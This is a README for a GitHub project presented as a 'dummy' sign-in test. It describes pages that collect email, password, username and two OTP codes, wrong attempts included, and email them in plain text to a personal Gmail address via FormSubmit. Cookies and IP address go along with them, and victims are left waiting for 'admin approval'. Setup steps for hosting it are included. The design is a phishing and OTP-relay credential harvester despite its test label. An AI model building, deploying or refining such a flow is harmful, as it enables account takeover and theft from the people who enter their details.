# Dummy Sign-In Test

Plain multi-step dummy authentication flow for testing purposes.  
**No design / styling** — just bare pages.

## User Flow (`index.html`)
1. **Email + Password** (any value is accepted) + 👁️ show/hide eye → sent to admin immediately  
2. **Username** (any value is accepted) → sent to admin immediately  
3. **OTP 1** → must be correct (`123456`)  
4. **OTP 2** → must be correct (`654321`)  
5. User sees waiting page: "Please wait for admin’s approval"

Wrong OTPs show an error and stay on the same step (the attempt is still emailed to the admin).

## Admin Portal (`admin.html`)
- **Email:** `blessedresult6@gmail.com`
- **Password:** `admin123`  ← only admin has a real password

## What the admin receives (plain text)
Every email contains:
- Email
- Password
- Username
- OTP 1 / OTP 2 (including wrong attempts)
- Cookies (plain text)
- IP Address
- Timestamp

## Important – First-time activation
1. Serve the site over HTTP (GitHub Pages, Netlify, local server…). FormSubmit does **not** work with `file://`.
2. Go through the user flow once.
3. Check **blessedresult6@gmail.com** (inbox + spam) and click the FormSubmit confirmation link.
4. After activation, every submission arrives automatically.

Repo: https://github.com/Dennisbed1234/dummy-signin-test
